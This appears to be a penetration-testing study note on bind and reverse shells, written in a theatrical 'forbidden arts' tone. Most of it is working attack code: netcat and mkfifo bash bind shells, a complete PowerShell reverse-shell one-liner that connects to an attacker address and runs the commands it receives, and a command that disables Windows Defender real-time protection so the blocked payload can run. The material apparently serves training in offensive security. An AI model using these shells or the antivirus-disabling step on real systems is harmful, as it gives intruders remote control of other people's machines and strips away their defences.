# 🐚 Shells & Payloads  
*Delve into the forbidden arts of initial compromise, where whispers in the void become footholds in vulnerable hosts. This module equips the practitioner with eldritch techniques to summon shells and craft payloads—essential rites in breaching the veil between attacker and target, be they Windows or Linux systems.*

> *“To speak with the machine, one must first teach it to listen.”*

<details>
<summary><h1>📌 Shell Basics</h1></summary>

&nbsp;&nbsp;&nbsp;&nbsp;<details>  
<summary><h2>⏩ Bind Shells</h2></summary>

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<details>
<summary><h3>Basic Bind Shell with Netcat</h3></summary>  

**Target Machine: Starting Netcat listener**  

```bash
nc -lvnp <PORT>
```

**Attack Machine: Connecting to target**  

```bash
nc -nv <IP> <PORT>
```

> **Note:** Know that this is not a proper shell. It is just a Netcat TCP session we have established. We can see its functionality by typing a simple message on the client-side and viewing it received on the server-side.

</details>

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<details>
<summary><h3>Establishing a Basic Bind Shell with Netcat</h3></summary>  

**Target Machine: Starting Netcat listener**  

```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l <PORT> > /tmp/f
```  

**Attack Machine: Starting Netcat listener**  

```bash
nc -nv <IP> <PORT>
```

> **Note:** Keep in mind that we had complete control over both our attack box and the target system in this scenario, which isn't typical.

</details>

</details>

&nbsp;&nbsp;&nbsp;&nbsp;<details>  
<summary><h2>⏪ Reverse Shells</h2></summary>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<details>
<summary><h3>Basic Reverse Shell with Netcat</h3></summary>  

**Attack Machine: Starting a listener**  

```bash
sudo nc -lvnp <PORT>
```

**Target Machine(Windows - CMD): Connect to the Attack Machine**  
```cmd
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<IP>',<PORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

If you get an error like this one:  
```cmd
At line:1 char:1
+ $client = New-Object System.Net.Sockets.TCPClient('<IP>',<PORT>) ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
This script contains malicious content and has been blocked by your antivirus software.
    + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException
    + FullyQualifiedErrorId : ScriptContainedMaliciousContent
```

Disable the antivirus using Powershell
```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
```

Re-run the CMD command.

</details>
</details>
</details>